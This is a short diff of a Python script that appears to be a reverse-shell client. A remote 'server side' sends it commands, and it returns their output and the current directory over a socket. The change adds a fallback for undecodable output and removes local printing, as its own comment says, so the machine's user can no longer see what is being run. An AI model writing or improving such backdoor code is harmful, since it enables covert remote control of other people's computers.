@@ -24,11 +24,12 @@ while True:
                 
                 # bytes and string versions of results
                 output_bytes = cmd.stdout.read() + cmd.stderr.read() # bytes version of streamed output
-                output_str = str(output_bytes, "utf-8") # plain old basic string
-
-                # getcwd allows the server side to see where the current working directory is on the client
-                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-                print(output_str) # client can see what server side is doing
+                try: 
+                    output_str = str(output_bytes, "utf-8") 
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                except: # Excepts and fixes: unicodedecodeerror: 'utf-8' codec can't decode byte 0x87
+                    output_bytes
+                    s.send(str.encode(str(output_bytes).replace('\r','') +'\n'+ str(os.getcwd()) + '> ')) # client can NOT see what server side is doing
 
 # close connection
 s.close()
